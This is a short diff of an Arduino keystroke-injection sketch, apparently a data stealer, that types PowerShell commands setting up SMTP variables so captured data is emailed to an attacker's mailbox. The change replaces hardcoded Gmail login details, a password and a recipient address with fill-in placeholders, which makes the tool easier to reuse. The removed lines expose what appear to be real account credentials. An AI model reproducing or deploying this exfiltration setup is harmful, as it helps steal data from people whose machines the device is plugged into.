@@ -103,19 +103,19 @@ void loop() {
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$SMTPUser = 'arduinoStealer@gmail.com'");
+  Keyboard.print("$SMTPUser = 'Gmail email to send the data'");
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$SMTPPassword = 'stealer09'");
+  Keyboard.print("$SMTPPassword = 'Gmail email password'");
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$MailtTo = 'apaquin4754@hotmail.com'");
+  Keyboard.print("$MailtTo = 'Email where you want to receive the data'");
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print("$MailFrom = 'arduinoStealer@gmail.com'");
+  Keyboard.print("$MailFrom = 'Gmail email to send the data'");
 
   typeKey(KEY_RETURN);
 
